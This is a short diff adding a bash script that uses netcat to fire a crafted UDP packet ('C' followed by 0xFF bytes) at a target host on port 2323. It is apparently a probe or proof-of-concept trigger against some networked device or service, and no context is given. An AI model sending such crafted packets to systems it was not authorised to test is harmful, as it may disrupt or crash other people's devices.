@@ -1,0 +1,2 @@
+#!/bin/bash
+echo -e "C\xFF\xFF\xFF" | nc -u $1 2323 -q 0
